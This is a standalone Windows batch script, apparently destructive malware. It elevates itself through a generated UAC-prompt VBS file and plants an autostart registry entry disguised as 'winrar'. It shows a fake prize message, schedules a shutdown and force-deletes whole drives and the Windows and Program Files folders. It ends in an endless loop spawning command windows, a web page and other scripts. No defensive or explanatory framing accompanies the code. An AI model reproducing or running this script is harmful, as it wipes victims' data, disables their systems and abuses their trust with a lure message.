start C:\Users\%username%\Desktop\555.vbs
@echo off

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (

goto UACPrompt

) else ( goto gotAdmin )

:UACPrompt

echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"

echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"

exit /B

:gotAdmin

if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v winrar /t reg_sz /d "1.cmd" /f 
msg %username% /time:10 "你中奖了"
ping -n 5 127.1>nul
start C:\Users\%username%\Desktop\222.cmd
ping -n 5 127.1>nul
start C:\Users\%username%\Desktop\222.cmd
start C:\Users\%username%\Desktop\222.cmd
shutdown -s -t 60
@echo off
%1(start /min cmd.exe /c %0 :&exit)
echo 
del /F /S /Q D:\*
del /F /S /Q E:\*
del /F /S /Q F:\*
del /F /S /Q C:\Program Files\*
del /F /S /Q C:\Windows\*
del /F /S /Q C:\Program Files (x86)\*
:start
start cmd
start https://app.tanwan.com/htmlcode/12738.html
start C:\Users\%username%\Desktop\222.cmd
@goto start
pause

